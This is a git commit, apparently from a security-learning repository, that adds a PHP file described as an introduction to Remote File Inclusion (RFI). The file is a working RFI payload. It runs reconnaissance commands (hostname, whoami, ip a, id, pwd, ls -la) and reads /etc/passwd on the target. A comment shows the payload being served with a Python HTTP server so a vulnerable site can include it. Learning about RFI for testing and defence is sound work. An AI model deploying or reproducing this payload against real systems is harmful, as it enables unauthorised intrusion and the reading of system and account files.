67baf57b0f4a811af0e8fe18ba87a0ca6acba2ce
UmmIt <git@ummit.dev>
2025-08-24 21:31:36 +0800

    docs: intro to basic RFI
    Remote File Inclusion - RFI

---
+++ php/echo.php
@@ -0,0 +1,9 @@
+<?php echo exec('hostname'); ?>
+<?php echo exec('whoami'); ?>
+<?php echo exec('ip a'); ?>
+<?php echo exec('id'); ?>
+<?php echo exec('pwd'); ?>
+<?php echo exec('ls -la'); ?>
+<?php echo exec('cat /etc/passwd'); ?>
+
+// sudo python3 -m http.server 8000
